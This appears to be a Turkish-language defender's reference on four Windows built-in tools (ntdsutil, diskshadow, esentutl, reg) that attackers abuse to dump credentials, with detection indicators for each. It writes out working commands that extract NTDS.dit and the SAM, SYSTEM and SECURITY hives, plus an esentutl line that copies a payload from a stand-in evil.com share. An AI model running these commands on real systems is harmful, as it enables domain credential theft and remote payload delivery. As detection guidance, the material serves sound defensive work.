

### ntdsutil.exe
Active Directory veritabanı yönetimi (DC'lerde). NTDS.dit'i dışarı çıkarma — domain hash dump. Volt Typhoon tarafından aktif olarak kullanıldığı belgelenmiş.

**Komut:**
- ntdsutil "activate instance ntds" ifm "create full C:\temp\ntds" q q

**IOC:** ifm parametresi, DC dışında çalışıyorsa kesin şüpheli

---

### diskshadow.exe

VSS yönetimi. Script ile NTDS.dit kopyalama

**Komut:**
- diskshadow /s payload.dsh

- dsh içi: create shadow, expose, copy ntds.dit

**IOC:** Script dosyası argümanı, Temp'te .dsh dosyası

---


### esentutl.exe

ESE veritabanı yönetimi. Dosya kopyalama, NTDS.dit çekme.

**Komut:**
- esentutl.exe /y C:\windows\ntds\ntds.dit /d C:\temp\ntds.dit /o
  
- esentutl.exe /y \\evil.com\share\payload.exe /d C:\temp\p.exe /o

**IOC:** /y parametresi = kopyalama, kaynak NTDS.dit veya SAM ise kritik

---

### reg.exe

Registry yönetimi. SAM ve SYSTEM hive'larını dışarı aktarma, credential dump için kullanılır.

**Komut:**
- reg save HKLM\SAM C:\temp\sam.hiv

- reg save HKLM\SYSTEM C:\temp\system.hiv
  
- reg save HKLM\SECURITY C:\temp\security.hiv

**IOC:** reg save + SAM/SYSTEM/SECURITY üçlüsü = credential dump girişimi